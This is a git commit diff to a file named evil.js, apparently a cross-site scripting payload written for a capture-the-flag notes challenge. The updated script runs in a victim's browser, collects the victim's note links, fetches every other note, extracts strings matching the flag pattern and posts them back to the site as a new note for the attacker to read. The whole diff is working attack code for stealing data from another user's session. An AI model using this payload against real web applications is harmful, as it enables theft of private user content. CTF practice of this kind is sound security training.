ddf1b95191bee8def5324444385d053d60ace291
Tan Ee Xin <conan.tan111@gmail.com>
2026-01-11 17:50:25 +0800

    Update evil.js

--- evil.js
+++ evil.js
@@ -1,8 +1,17 @@
 fetch('/').then(r=>r.text()).then(h=>{
   let notes=h.match(/\/note\/[a-f0-9]+/g)||[];
-  fetch('/note/new',{
-    method:'POST',
-    headers:{'Content-Type':'application/x-www-form-urlencoded'},
-    body:'title=FLAGDATA&body='+encodeURIComponent(notes.join(','))
+  let unique=[...new Set(notes)];
+  let current=location.pathname;
+  let others=unique.filter(n=>n!==current);
+  
+  // Fetch each note and look for flag
+  Promise.all(others.map(n=>fetch(n).then(r=>r.text()))).then(pages=>{
+    let allText=pages.join('\n---\n');
+    let flags=allText.match(/uoftctf\{[^}]+\}/g)||['NO_FLAG_FOUND'];
+    fetch('/note/new',{
+      method:'POST',
+      headers:{'Content-Type':'application/x-www-form-urlencoded'},
+      body:'title=FLAG&body='+encodeURIComponent(flags.join(',')+'\n\nNotes:'+others.join(','))
+    });
   });
 });
